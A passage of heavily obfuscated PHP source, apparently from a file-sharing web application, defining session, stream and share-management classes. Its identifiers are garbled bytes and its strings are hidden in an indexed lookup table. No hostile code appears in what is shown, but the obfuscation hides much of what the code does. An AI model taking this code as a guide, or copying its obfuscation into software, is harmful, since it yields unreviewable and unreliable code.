$_SERVER[ùÆÎÔ“Ñ][1466])) { return parent::fileOutImageServer($ú™Èëî, $¡Öœ½­±); } parent::fileOutImage($ú™Èëî, $¡Öœ½­±); } public function fileOutLink($úÕ³³ëã) { $èÓÎ»¸› =& $_SERVER[ùÆÎÔ“Ñ]; if (substr($úÕ³³ëã, 0, 7) == $èÓÎ»¸›[1339]) { $úÕ³³ëã = $èÓÎ»¸›[1340] . substr($úÕ³³ëã, 7); } header($èÓÎ»¸›[161] . $úÕ³³ëã); die; } public function getHost() { $Å‹§×ä» =& $_SERVER[ùÆÎÔ“Ñ]; $ºûñÚ¦ä = str_rtrim(parent::getHost(), $Å‹§×ä»[8] . $this->bucket); $ºûñÚ¦ä = explode($Å‹§×ä»[183], $ºûñÚ¦ä); return $ºûñÚ¦ä[0] . $Å‹§×ä»[183] . $this->bucket . $Å‹§×ä»[10] . $ºûñÚ¦ä[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‘ÛúõØµ, $·ù™æÀË = 0) { parent::__construct(); $this->source = $‘ÛúõØµ; $this->sourceSize = $·ù™æÀË; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($àÜĞ¸²Ã = false) { return $this->sourceSize; } public function getContent($¶Õ¥¶š = false) { return $this->fileSubstr($¶Õ¥¶š, 0, $this->sourceSize); } public function fileSubstr($¬­°ˆ¯Ÿ = false, $§›—Í”µ = 0, $¬­ÄƒÄä = 0) { if (!$¬­ÄƒÄä) { $¬­ÄƒÄä = $this->sourceSize; } $âıáÈ·ñ = $this->sourceSize - $§›—Í”µ; if ($¬­ÄƒÄä >= $âıáÈ·ñ) { $¬­ÄƒÄä = $âıáÈ·ñ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§›—Í”µ, $¬­ÄƒÄä); } if ($this->sourceType == self::TYPE_FILE) { if ($¬­ÄƒÄä <= 0) { return $_SERVER[ùÆÎÔ“Ñ][12]; } $ğ•äñƒ† = ftell($this->source); fseek_64($this->source, $ğ•äñƒ† + $§›—Í”µ); $©ÙŒˆ¼è = @fread($this->source, $¬­ÄƒÄä); fseek_64($this->source, $ğ•äñƒ†); return $©ÙŒˆ¼è; } } public function hashMd5($ÙÑ‰³®ê = false) { return md5($this->getContent()); } public static function hash($•¼¿ÅŠè, $œ¢æŠô¿ = 0) { $Û³¿ßÏ  = new PathDriverStream($•¼¿ÅŠè, $œ¢æŠô¿); return $Û³¿ßÏ ->hashSimple($•¼¿ÅŠè); } public static function md5($í¤•‰, $ãËŞ÷†¬ = 0) { $¿ÍÙò¬ù = new PathDriverStream($í¤•‰, $ãËŞ÷†¬); return $¿ÍÙò¬ù->hashMd5($í¤•‰); } } goto Dìµ¬¨•Ì‰; E‹›Ä×äù: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\137\163\x65\x73\x73\151\157\156"; public function get($ø–Ôı‹) { $©üÒêê =& $_SERVER[ùÆÎÔ“Ñ]; $ÂªÒ¦ìú = $this->where(array($©üÒêê[1992] => $ø–Ôı‹))->find(); if (!is_array($ÂªÒ¦ìú)) { return !1; } return $ÂªÒ¦ìú[$©üÒêê[756]]; } public function set($Í½÷ï«ø, $ğÄ’«À˜, $’ß‘ô„· = 3600) { $øŠ¶Ù‘µ =& $_SERVER[ùÆÎÔ“Ñ]; $Ä“ ‹°¹ = array($øŠ¶Ù‘µ[1992] => $Í½÷ï«ø, $øŠ¶Ù‘µ[1896] => $ğÄ’«À˜, $øŠ¶Ù‘µ[1993] => $’ß‘ô„· + time()); if (Session::get($øŠ¶Ù‘µ[1994])) { $Ä“ ‹°¹[$øŠ¶Ù‘µ[1667]] = Session::get($øŠ¶Ù‘µ[1994]); } else { $Ä“ ‹°¹[$øŠ¶Ù‘µ[1667]] = 0; } if ($this->get($Í½÷ï«ø)) { return $this->where(array($øŠ¶Ù‘µ[1992] => $Í½÷ï«ø))->save($Ä“ ‹°¹); } else { return $this->add($Ä“ ‹°¹, array(), !0); } } public function remove($ğÎƒ¨â) { return $this->where(array($_SERVER[ùÆÎÔ“Ñ][1992] => $ğÎƒ¨â))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ùÆÎÔ“Ñ][1995] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\151\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\164\x2c\x75\160\x64\x61\164\x65", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\143\x72\145\x61\x74\x65\124\151\155\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\x66\x75\x6e\x63\x74\151\157\156"), array("\x6f\160\x74\x69\x6f\156\x73", '', "\151\x6e\163\145\162\164\54\165\160\144\141\x74\x65\x2c\x73\x65\x6c\x65\143\164", "\x6a\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($µóÉÔ¨ğ) { $³‘õÕŠ =& $_SERVER[ùÆÎÔ“Ñ]; $¾µ±¢Å = isset($µóÉÔ¨ğ[0]) ? $µóÉÔ¨ğ[0] : !1; return array($³‘õÕŠ[1996] => array(USER_ID, $³‘õÕŠ[1997]), $³‘õÕŠ[1937] => array($¾µ±¢Å, $³‘õÕŠ[1998])); } protected function listSimple() { $¿Ç¶ñËõ = array($_SERVER[ùÆÎÔ“Ñ][1667] => USER_ID); $ŒŞ‡ÈÈË = $this->field($this->fieldList)->where($¿Ç¶ñËõ)->select(); return $ŒŞ‡ÈÈË ? $ŒŞ‡ÈÈË : array(); } protected function getInfo($ãæ¸¡¬©, $µ¬µ„»š = false) { $¡É°·† =& $_SERVER[ùÆÎÔ“Ñ]; if ($µ¬µ„»š) { return $this->_getShareInfo(array($¡É°·†[489] => $ãæ¸¡¬©)); } $ÖºŸœ = $this->cacheFunctionGet($¡É°·†[1939], $ãæ¸¡¬©); return $ÖºŸœ; } public function getInfoByHash($Ùò¸¡«ï) { return $this->_getShareInfo(array($_SERVER[ùÆÎÔ“Ñ][491] => $Ùò¸¡«ï)); } public function getInfoByPath($Š¥ŞûÜÕ) { $‚ôóåŠ =& $_SERVER[ùÆÎÔ“Ñ]; $‚âê‰Íù = array($‚ôóåŠ[1667] => USER_ID, $‚ôóåŠ[402] => $Š¥ŞûÜÕ); return $this->_getShareInfo($‚âê‰Íù); } public function getInfoBySourcePath($Ï£»£ˆü) { $«„»šù =& $_SERVER[ùÆÎÔ“Ñ]; $½—»Öäù = array($«„»šù[1667] => USER_ID, $«„»šù[1181] => $Ï£»£ˆü); return $this->_getShareInfo($½—»Öäù); } private function _getShareInfo($ªÃÊî‚Ğ) { $Âº”™”• =& $_SERVER[ùÆÎÔ“Ñ]; $Á¹«óå¬ = $this->where($ªÃÊî‚Ğ)->find(); if (!$Á¹«óå¬) { return !1; } $ªÃÊî‚Ğ = array($Âº”™”•[489] => $Á¹«óå¬[$Âº”™”•[489]]); $ŠÉºÇâÑ = $Âº”™”•[1999]; $®ÔúÇ¶§ = Model($Âº”™”•[602])->order($Âº”™”•[399])->field($ŠÉºÇâÑ)->where($ªÃÊî‚Ğ)->select(); if ($Á¹«óå¬[$Âº”™”•[402]] == $Âº”™”•[197]) { $Á¹«óå¬[$Âº”™”•[86]] = IO::info($Á¹«óå¬[$Âº”™”•[1181]]); } else { $Á¹«óå¬[$Âº”™”•[86]] = Model($Âº”™”•[1341])->pathInfo($Á¹«óå¬[$Âº”™”•[402]]); } $Á¹«óå¬[$Âº”™”•[2000]] = $®ÔúÇ¶§; return $Á¹«óå¬; } protected function getInfoAuth($Àƒ¦ˆ ) { $áÑšçã± =& $_SERVER[ùÆÎÔ“Ñ]; $­½¸¬Ù¶ = $this->getInfo($Àƒ¦ˆ ); if ($­½¸¬Ù¶[$áÑšçã±[1667]] == USER_ID) { $­½¸¬Ù¶[$áÑšçã±[413]] = $­½¸¬Ù¶[$áÑšçã±[86]][$áÑšçã±[413]]; } else { $­½¸¬Ù¶[$áÑšçã±[413]] = Model($áÑšçã±[502])->authMake($­½¸¬Ù¶[$áÑšçã±[2000]]); } return $­½¸¬Ù¶; } protected function listData($ŸüÎ‰“ = null, $çÖÈ·Œˆ = 300) { $ÃêìİËÛ =& $_SERVER[ùÆÎÔ“Ñ]; $ã¦´¯ºµ = array(array($ÃêìİËÛ[494] => array($ÃêìİËÛ[1017], 0), $ÃêìİËÛ[496] => array($ÃêìİËÛ[1017], 0), $ÃêìİËÛ[2001] => $ÃêìİËÛ[1955])); if ($ŸüÎ‰“ == $ÃêìİËÛ[2002]) { $ã¦´¯ºµ = array($ÃêìİËÛ[494] => 1); } else { if ($ŸüÎ‰“ == $ÃêìİËÛ[1166]) { $ã¦´¯ºµ = array($ÃêìİËÛ[496] => 1); } } $ã¦´¯ºµ[$ÃêìİËÛ[1667]] = USER_ID; $­Æ˜¬Ö¨ = $this->where($ã¦´¯ºµ)->selectPage($çÖÈ·Œˆ); return $­Æ˜¬Ö¨; } protected function listToMe($ªÎ—¯Í™ = 300) { $õ­—µ£¸ =& $_SERVER[ùÆÎÔ“Ñ]; $ìü›á° = Model($õ­—µ£¸[2003])->userGroupParents(USER_ID); $êƒî½íÍ = array($õ­—µ£¸[586] => SourceModel::TYPE_USER, $õ­—µ£¸[505] => USER_ID); if ($ìü›á°) { $êƒî½íÍ = array(array($õ­—µ£¸[586] => SourceModel::TYPE_USER, $õ­—µ£¸[505] => USER_ID), array($õ­—µ£¸[586] => SourceModel::TYPE_GROUP, $õ­—µ£¸[505] => array($õ­—µ£¸[7], $ìü›á°)), $õ­—µ£¸[2001] => $õ­—µ£¸[1955]); } $òÄ˜§Ûõ = Model($õ­—µ£¸[602])->where($êƒî½íÍ)->selectPage($ªÎ—¯Í™); $±‚Î¿é¦ = array_to_keyvalue_group($òÄ˜§Ûõ[$õ­—µ£¸[369]], $õ­—µ£¸[489]); if (!$±‚Î¿é¦) { return $òÄ˜§Ûõ; } $×ïÊ£¢ = $õ­—µ£¸[2004]; $êƒî½íÍ = array($õ­—µ£¸[489] => array($õ­—µ£¸[418], array_keys($±‚Î¿é¦)), $õ­—µ£¸[1667] => array($õ­—µ£¸[1019], $õ­—µ£¸[197])); $İğä©š° = $this->field($×ïÊ£¢)->where($êƒî½íÍ)->select(); foreach ($İğä©š° as $Ä˜É±ŸŞ => &$ü§úÆçÅ) { $ü§úÆçÅ[$õ­—µ£¸[2000]] = $±‚Î¿é¦[$ü§úÆçÅ[$õ­—µ£¸[489]]]; } unset($ü§úÆçÅ); $ä“ÛÙğÄ = array($õ­—µ£¸[2005] => $İğä©š°, $õ­—µ£¸[2006] => $òÄ˜§Ûõ[$õ­—µ£¸[366]]); return $ä“ÛÙğÄ; } protected function shareAdd($¥Ñ•ŒùŸ, $®¦Ì´ûˆ) { $úÚ‹‰Šæ =& $_SERVER[ùÆÎÔ“Ñ]; $ª»Íò…ù = $this->_addShareData($¥Ñ•ŒùŸ, $®¦Ì´ûˆ); if (!empty($®¦Ì´ûˆ[$úÚ‹‰Šæ[2007]])) { $this->_shareAuthSet($ª»Íò…ù, $®¦Ì´ûˆ[$úÚ‹‰Šæ[2007]]); } $this->shareEventAdd($¥Ñ•ŒùŸ, $®¦Ì´ûˆ, $úÚ‹‰Šæ[1169]); return $ª»Íò…ù; } protected function shareAddSystem($Í–ùÄøÆ, $ÆÁ­É¸ş) { $üÍ„ó× =& $_SERVER[ùÆÎÔ“Ñ]; $’£¡ù¯Ò = $this->_addShareData($Í–ùÄøÆ, $ÆÁ­É¸ş, $üÍ„ó×[1290]); $this->_shareAuthSet($’£¡ù¯Ò, $ÆÁ­É¸ş[$üÍ„ó×[2007]]); return $’£¡ù¯Ò; } private function shareEventAdd($»¸ø¢Ëà, $Ïâãáƒ‰, $Î‡”ˆ¤ô = "\141\x64\x64") { $ğúĞ´ã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$»¸ø¢Ëà || $»¸ø¢Ëà == $ğúĞ´ã[197]) { return; } if ($Î‡”ˆ¤ô == $ğúĞ´ã[1169]) { if ($Ïâãáƒ‰[$ğúĞ´ã[494]] == $ğúĞ´ã[88]) { Model($ğúĞ´ã[570])->eventShare($»¸ø¢Ëà, $ğúĞ´ã[2008]); } if ($Ïâãáƒ‰[$ğúĞ´ã[496]] == $ğúĞ´ã[88]) { Model($ğúĞ´ã[570])->eventShare($»¸ø¢Ëà, $ğúĞ´ã[2009]); } return; } $äß•²òé = $this->getInfoByPath($»¸ø¢Ëà); $ÙõõĞú = $ğúĞ´ã[2010]; if ($äß•²òé[$ğúĞ´ã[494]] == $ğúĞ´ã[197] && $Ïâãáƒ‰[$ğúĞ´ã[494]] == $ğúĞ´ã[88]) { $ÙõõĞú = $ğúĞ´ã[2008]; } if ($äß•²òé[$ğúĞ´ã[494]] == $ğúĞ´ã[88] && $Ïâãáƒ‰[$ğúĞ´ã[494]] == $ğúĞ´ã[197]) { $ÙõõĞú = $ğúĞ´ã[2011]; } if ($äß•²òé[$ğúĞ´ã[496]] == $ğúĞ´ã[197] && $Ïâãáƒ‰[$ğúĞ´ã[496]] == $ğúĞ´ã[88]) { $ÙõõĞú = $ğúĞ´ã[2009]; } if ($äß•²òé[$ğúĞ´ã[496]] == $ğúĞ´ã[88] && $Ïâãáƒ‰[$ğúĞ´ã[496]] == $ğúĞ´ã[197]) { $ÙõõĞú = $ğúĞ´ã[2012]; } Model($ğúĞ´ã[570])->eventShare($»¸ø¢Ëà, $ÙõõĞú); return; } private function _addShareData($ñ’ÃÀû, $­€ªˆ¥¨ = array(), $‹¢ ¿¥ö = false) { $µé‡àÈ =& $_SERVER[ùÆÎÔ“Ñ]; $§ÀÍ«¸½ = $‹¢ ¿¥ö == $µé‡àÈ[1290] ? 0 : USER_ID; $¨ÔîÀ‚ = array($µé‡àÈ[417] => $ñ’ÃÀû, $µé‡àÈ[1658] => $§ÀÍ«¸½); if ($ñ’ÃÀû == 0) { $¨ÔîÀ‚ = array($µé‡àÈ[2013] => $­€ªˆ¥¨[$µé‡àÈ[1181]], $µé‡àÈ[1658] => $§ÀÍ«¸½); } if ($Çˆóéé² = $this->where($¨ÔîÀ‚)->find()) { return $Çˆóéé²[$µé‡àÈ[489]]; } if ($ñ’ÃÀû == 0) { $”Â²í¸ç = array($µé‡àÈ[32] => get_path_this($­€ªˆ¥¨[$µé‡àÈ[84]])); } else { $”Â²í¸ç = Model($µé‡àÈ[826])->sourceInfo($ñ’ÃÀû); if (!$”Â²í¸ç) { return !1; } } if (!$­€ªˆ¥¨[$µé‡àÈ[1567]]) { $­€ªˆ¥¨[$µé‡àÈ[1567]] = $”Â²í¸ç[$µé‡àÈ[32]]; } $½Æì¤Ò” = array($µé‡àÈ[1658] => $§ÀÍ«¸½, $µé‡àÈ[417] => $ñ’ÃÀû, $µé‡àÈ[1567] => $µé‡àÈ[12], $µé‡àÈ[494] => 0, $µé‡àÈ[496] => 0, $µé‡àÈ[1181] => $µé‡àÈ[12], $µé‡àÈ[307] => $µé‡àÈ[12], $µé‡àÈ[894] => $µé‡àÈ[12], $µé‡àÈ[2014] => 0, $µé‡àÈ[2015] => 0, $µé‡àÈ[497] => 0, $µé‡àÈ[498] => $µé‡àÈ[12], $µé‡àÈ[491] => $µé‡àÈ[12]); $ˆìğİ = explode($µé‡àÈ[50], $µé‡àÈ[2016]); foreach ($ˆìğİ as $ĞöÒõÛ’) { if (!isset($­€ªˆ¥¨[$ĞöÒõÛ’])) { continue; } $½Æì¤Ò”[$ĞöÒõÛ’] = $­€ªˆ¥¨[$ĞöÒõÛ’]; } $¤’Ğ×ÌÈ = $this->add($½Æì¤Ò”); $Œ¸ª—– = array($µé‡àÈ[491] => short_id($¤’Ğ×ÌÈ)); $this->where(array($µé‡àÈ[488] => $¤’Ğ×ÌÈ))->save($Œ¸ª—–); return $¤’Ğ×ÌÈ; } private function _shareAuthSet($±¿½Í ¬, $Ãğ°ßĞÄ) { $Œ–´áÛ =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($Ãğ°ßĞÄ)) { return !1; } $©½¾Êš = Model($Œ–´áÛ[1965]); $©½¾Êš->where(array($Œ–´áÛ[489] => $±¿½Í ¬))->delete(); $¼µ¶Òã = array(); foreach ($Ãğ°ßĞÄ as $áÇ¿ø‚İ) { $›íĞşß = SourceModel::TYPE_USER; if ($áÇ¿ø‚İ[$Œ–´áÛ[411]] == SourceModel::TYPE_GROUP) { $›íĞşß = SourceModel::TYPE_GROUP; } $›áª‚÷‚ = array($Œ–´áÛ[489] => $±¿½Í ¬, $Œ–´áÛ[411] => $›íĞşß, $Œ–´áÛ[505] => intval($áÇ¿ø‚İ[$Œ–´áÛ[505]]), $Œ–´áÛ[1961] => 0, $Œ–´áÛ[2017] => -1); if ($áÇ¿ø‚İ[$Œ–´áÛ[1961]]) { $›áª‚÷‚[$Œ–´áÛ[1961]] = $áÇ¿ø‚İ[$Œ–´áÛ[1961]]; } else { if ($áÇ¿ø‚İ[$Œ–´áÛ[2017]]) { $›áª‚÷‚[$Œ–´áÛ[2017]] = $áÇ¿ø‚İ[$Œ–´áÛ[2017]]; } } $¼µ¶Òã[] = $›áª‚÷‚; } return $©½¾Êš->addAll($¼µ¶Òã, array(), !0); } public function numViewAdd($¨êäš) { $¸¡Ì‚ßˆ =& $_SERVER[ùÆÎÔ“Ñ]; $äÓá“œë = array($¸¡Ì‚ßˆ[488] => $¨êäš); $this->where($äÓá“œë)->setAdd($¸¡Ì‚ßˆ[2014]); } public function numDownloadAdd($ÌîİÁ†Ù) { $Ê¦áÎ‡± =& $_SERVER[ùÆÎÔ“Ñ]; $şªÉ¿„¨ = array($Ê¦áÎ‡±[488] => $ÌîİÁ†Ù); $this->where($şªÉ¿„¨)->setAdd($Ê¦áÎ‡±[2015]); } protected function shareEdit($ˆƒùÒÖû, $Òöî…Éä) { $·Ñİ¾Ñİ =& $_SERVER[ùÆÎÔ“Ñ]; $î¼ĞÒ® = $this->getInfo($ˆƒùÒÖû); if (!$î¼ĞÒ®) { return !1; } $this->_checkLinkShare($Òöî…Éä, $î¼ĞÒ®); $ÇŒä¶Àû = array(); $»îºÉë¥ = explode($·Ñİ¾Ñİ[50], $·Ñİ¾Ñİ[2018]); foreach ($»îºÉë¥ as $”‚ûÂı¶) { if (!array_key_exists($”‚ûÂı¶, $Òöî…Éä)) { continue; } $ÇŒä¶Àû[$”‚ûÂı¶] = $Òöî…Éä[$”‚ûÂı¶]; } $this->shareEventAdd($î¼ĞÒ®[$·Ñİ¾Ñİ[402]], $Òöî…Éä, $·Ñİ¾Ñİ[1827]); $this->where(array($·Ñİ¾Ñİ[488] => $ˆƒùÒÖû))->save($ÇŒä¶Àû); if (isset($Òöî…Éä[$·Ñİ¾Ñİ[2007]])) { $this->_shareAuthSet($ˆƒùÒÖû, $Òöî…Éä[$·Ñİ¾Ñİ[2007]]); } return !0; } private function _checkLinkShare($ã¿„ÇÂô, $‚Šß÷ìü) { $“¤Ş–Å =& $_SERVER[ùÆÎÔ“Ñ]; if ($ã¿„ÇÂô[$“¤Ş–Å[494]] != $“¤Ş–Å[88]) { return; } $À—‡â¼Ä = $‚Šß÷ìü[$“¤Ş–Å[86]][$“¤Ş–Å[402]]; if ($‚Šß÷ìü[$“¤Ş–Å[86]][$“¤Ş–Å[33]] != $“¤Ş–Å[199]) { $ó¢¯¨ºİ = $this->_folderReport($À—‡â¼Ä); if (!$ó¢¯¨ºİ) { return; } show_json(LNG($“¤Ş–Å[2019]) . $“¤Ş–Å[2020] . $ó¢¯¨ºİ, !1); } $´ ©‹ = Model($“¤Ş–Å[826])->fileInfoGet($‚Šß÷ìü[$“¤Ş–Å[86]][$“¤Ş–Å[402]]); if (!$´ ©‹) { return; } $­ ‹Å¤û = $this->shareFileMeta($´ ©‹[$“¤Ş–Å[468]]); if (isset($­ ‹Å¤û[$“¤Ş–Å[374]]) && $­ ‹Å¤û[$“¤Ş–Å[374]] == $“¤Ş–Å[88]) { show_json(LNG($“¤Ş–Å[2021]), !1); } } private function _folderReport($¿°Ü©Ú) { $ Á‰„ïù =& $_SERVER[ùÆÎÔ“Ñ]; $ªèôˆİµ = array($ Á‰„ïù[468] => array($ Á‰„ïù[1017], 0), $ Á‰„ïù[751] => 3); $ä¤ì™ = Model($ Á‰„ïù[2022])->where($ªèôˆİµ)->field($ Á‰„ïù[468])->select(); if (!$ä¤ì™) { return !1; } $ä¤ì™ = array_to_keyvalue($ä¤ì™, $ Á‰„ïù[12], $ Á‰„ïù[468]); $Ì²˜Á›° = $ Á‰„ïù[50] . $¿°Ü©Ú . $ Á‰„ïù[50]; $ªèôˆİµ = array($ Á‰„ïù[468] => array($ Á‰„ïù[7], $ä¤ì™), $ Á‰„ïù[521] => array($ Á‰„ïù[383], "\x25{$Ì²˜Á›°}\x25"), $ Á‰„ïù[431] => 0); $Éçİ ¼Å = Model($ Á‰„ïù[826])->where($ªèôˆİµ)->field($ Á‰„ïù[2023])->find(); if (!$Éçİ ¼Å) { return !1; } $¿Èš–İ = substr($Éçİ ¼Å[$ Á‰„ïù[521]], strpos($Éçİ ¼Å[$ Á‰„ïù[521]], $Ì²˜Á›°)); $ªèôˆİµ = array($ Á‰„ïù[402] => array($ Á‰„ïù[7], trim($¿Èš–İ, $ Á‰„ïù[50]))); $¶Á»Òõ = Model($ Á‰„ïù[826])->where($ªèôˆİµ)->field($ Á‰„ïù[32])->select(); $šïÔ¥Å = array_to_keyvalue($¶Á»Òõ, $ Á‰„ïù[12], $ Á‰„ïù[32]); $šïÔ¥Å[] = $Éçİ ¼Å[$ Á‰„ïù[32]]; return implode($ Á‰„ïù[8], $šïÔ¥Å); } protected function remove($Ù¸ôÉĞ¬) { $‡Õ°²ª™ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($Ù¸ôÉĞ¬)) { $Ù¸ôÉĞ¬ = array($‡Õ°²ª™[7], $Ù¸ôÉĞ¬); } $§Æ‚˜¢û = array($‡Õ°²ª™[489] => $Ù¸ôÉĞ¬); $İ¶Û“ï = $this->where($§Æ‚˜¢û)->delete(); if ($İ¶Û“ï) { Model($‡Õ°²ª™[602])->where(array($‡Õ°²ª™[489] => $Ù¸ôÉĞ¬))->delete(); } $á‘ü•¢» = is_array($Ù¸ôÉĞ¬) ? $Ù¸ôÉĞ¬[1] : array($Ù¸ôÉĞ¬); for ($õš•›øà = 0; $õš•›øà < count($á‘ü•¢»); $õš•›øà++) { $ÒƒÎ‹á€ = $this->getInfo($á‘ü•¢»[$õš•›øà]); if ($ÒƒÎ‹á€[$‡Õ°²ª™[496]] == $‡Õ°²ª™[88]) { Model($‡Õ°²ª™[570])->eventShare($ÒƒÎ‹á€[$‡Õ°²ª™[402]], $‡Õ°²ª™[2012]); } if ($ÒƒÎ‹á€[$‡Õ°²ª™[494]] == $‡Õ°²ª™[88]) { Model($‡Õ°²ª™[570])->eventShare($ÒƒÎ‹á€[$‡Õ°²ª™[402]], $‡Õ°²ª™[2011]); } } return $İ¶Û“ï; } protected function removeBySource($ùæÇ¦ìÇ) { $åùÖü·‘ =& $_SERVER[ùÆÎÔ“Ñ]; $ñÀ„ƒí© = array($åùÖü·‘[417] => array($åùÖü·‘[418], $ùæÇ¦ìÇ)); $ŒãÈÆ· = $this->field($åùÖü·‘[489])->where($ñÀ„ƒí©)->select(); $ŒãÈÆ· = array_to_keyvalue($ŒãÈÆ·, $åùÖü·‘[12], $åùÖü·‘[489]); if (!$ŒãÈÆ·) { return; } $ñÀ„ƒí© = array($åùÖü·‘[488] => array($åùÖü·‘[418], $ŒãÈÆ·)); $this->where($ñÀ„ƒí©)->delete(); Model($åùÖü·‘[602])->where($ñÀ„ƒí©)->delete(); } public function listAll($ŠœˆıÜ) { $ÔÌîà²ç =& $_SERVER[ùÆÎÔ“Ñ]; $ˆò°¾å¯ = array(); if ($ŠœˆıÜ[$ÔÌîà²ç[1667]]) { $ˆò°¾å¯[$ÔÌîà²ç[1667]] = $ŠœˆıÜ[$ÔÌîà²ç[1667]]; } if ($ŠœˆıÜ[$ÔÌîà²ç[762]]) { $­•‰È§Ó = $ŠœˆıÜ[$ÔÌîà²ç[497]] ? $ŠœˆıÜ[$ÔÌîà²ç[497]] : strtotime(date($ÔÌîà²ç[2024])); $ˆò°¾å¯[$ÔÌîà²ç[200]] = array($ÔÌîà²ç[333], array($ŠœˆıÜ[$ÔÌîà²ç[762]], $­•‰È§Ó)); } if ($ŠœˆıÜ[$ÔÌîà²ç[33]]) { $ˆò°¾å¯[$ŠœˆıÜ[$ÔÌîà²ç[33]]] = 1; } else { $ˆò°¾å¯[] = array($ÔÌîà²ç[494] => array($ÔÌîà²ç[1017], 0), $ÔÌîà²ç[496] => array($ÔÌîà²ç[1017], 0), $ÔÌîà²ç[2001] => $ÔÌîà²ç[1955]); } if ($ŠœˆıÜ[$ÔÌîà²ç[1951]]) { $ˆò°¾å¯[] = array($ÔÌîà²ç[491] => $ŠœˆıÜ[$ÔÌîà²ç[1951]], $ÔÌîà²ç[1567] => array($ÔÌîà²ç[383], "\x25{$ŠœˆıÜ[$ÔÌîà²ç[1951]]}\45"), $ÔÌîà²ç[2001] => $ÔÌîà²ç[1955]); } $Ì˜¿Ë«€ = $this->_makeOrder()->where($ˆò°¾å¯)->selectPage(20); if (empty($Ì˜¿Ë«€[$ÔÌîà²ç[369]])) { return array(); } $this->_listDataApply($Ì˜¿Ë«€[$ÔÌîà²ç[369]]); return $Ì˜¿Ë«€; } public function listDataApply($ş¬ˆ¶Ëï) { $this->_listDataApply($ş¬ˆ¶Ëï); return $ş¬ˆ¶Ëï; } private function _listDataApply(&$¬øŒÔ«Ô) { $÷ˆ´¿¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ğé§Óò„ = array_to_keyvalue($¬øŒÔ«Ô, $÷ˆ´¿¬[12], $÷ˆ´¿¬[1667]); $‚Šú‹ = Model($÷ˆ´¿¬[535])->userListInfo(array_unique($ğé§Óò„)); $äÎ˜¦¼ƒ = array_to_keyvalue($¬øŒÔ«Ô, $÷ˆ´¿¬[12], $÷ˆ´¿¬[402]); $õë‹ˆ©† = Model($÷ˆ´¿¬[826])->sourceListInfo($äÎ˜¦¼ƒ, !0); foreach ($¬øŒÔ«Ô as $Ì…ˆê·ñ => &$Şœ³–‰†) { $ûº­é™“ = $Şœ³–‰†[$÷ˆ´¿¬[1667]]; $Şœ³–‰†[$÷ˆ´¿¬[2025]] = $‚Šú‹[$ûº­é™“] ? $‚Šú‹[$ûº­é™“] : !1; $À²ìĞ¡Ò = $Şœ³–‰†[$÷ˆ´¿¬[402]]; $Şœ³–‰†[$÷ˆ´¿¬[86]] = $õë‹ˆ©†[$À²ìĞ¡Ò] ? $õë‹ˆ©†[$À²ìĞ¡Ò] : !1; if ($Şœ³–‰†[$÷ˆ´¿¬[86]][$÷ˆ´¿¬[431]] == $÷ˆ´¿¬[88]) { unset($¬øŒÔ«Ô[$Ì…ˆê·ñ]); } if ($Şœ³–‰†[$÷ˆ´¿¬[86]] != $÷ˆ´¿¬[197] && !$Şœ³–‰†[$÷ˆ´¿¬[86]]) { unset($¬øŒÔ«Ô[$Ì…ˆê·ñ]); } } unset($Şœ³–‰†); $¬øŒÔ«Ô = array_values($¬øŒÔ«Ô); } private function _makeOrder($´†¨£éá = '') { $«©ëØó« =& $_SERVER[ùÆÎÔ“Ñ]; $ãÂÑøÅÑ = array($«©ëØó«[200], $«©ëØó«[497], $«©ëØó«[2014], $«©ëØó«[2015]); $†ÌÄê–Œ = array($«©ëØó«[450] => $«©ëØó«[451], $«©ëØó«[452] => $«©ëØó«[453]); $õ•”’í = Input::get($«©ëØó«[457], $«©ëØó«[7], $«©ëØó«[423], $ãÂÑøÅÑ); $¯˜çı­¹ = Input::get($«©ëØó«[458], $«©ëØó«[7], $«©ëØó«[2026], array($«©ëØó«[1948], $«©ëØó«[452])); $¯˜çı­¹ = $†ÌÄê–Œ[$¯˜çı­¹]; $´†¨£éá = $´†¨£éá . "{$õ•”’í}\x20{$¯˜çı­¹}"; return $this->order($´†¨£éá); } public function reportAdd($…ÚïÔ÷á) { $ë‰…êñ© =& $_SERVER[ùÆÎÔ“Ñ]; $¤Ñ´¦¸ = array($ë‰…êñ©[489] => $…ÚïÔ÷á[$ë‰…êñ©[489]], $ë‰…êñ©[1667] => USER_ID); if (Model($ë‰…êñ©[2022])->where($¤Ñ´¦¸)->find()) { return !1; } $Ù£àŞ¶û = array($ë‰…êñ©[489] => $…ÚïÔ÷á[$ë‰…êñ©[489]], $ë‰…êñ©[1567] => $…ÚïÔ÷á[$ë‰…êñ©[1567]], $ë‰…êñ©[402] => $…ÚïÔ÷á[$ë‰…êñ©[402]], $ë‰…êñ©[468] => $…ÚïÔ÷á[$ë‰…êñ©[468]], $ë‰…êñ©[1667] => USER_ID, $ë‰…êñ©[33] => $…ÚïÔ÷á[$ë‰…êñ©[33]], $ë‰…êñ©[453] => $…ÚïÔ÷á[$ë‰…êñ©[453]]); return Model($ë‰…êñ©[2022])->add($Ù£àŞ¶û); } public function reportList($Ì±¬Âúì) { $¡ÙĞ×›€ =& $_SERVER[ùÆÎÔ“Ñ]; $€…Ïš“× = array(); if ($Ì±¬Âúì[$¡ÙĞ×›€[762]]) { $şï…¥Ëâ = $Ì±¬Âúì[$¡ÙĞ×›€[497]] ? $Ì±¬Âúì[$¡ÙĞ×›€[497]] : strtotime(date($¡ÙĞ×›€[2024])); $€…Ïš“×[$¡ÙĞ×›€[200]] = array($¡ÙĞ×›€[333], array($Ì±¬Âúì[$¡ÙĞ×›€[762]], $şï…¥Ëâ)); } if 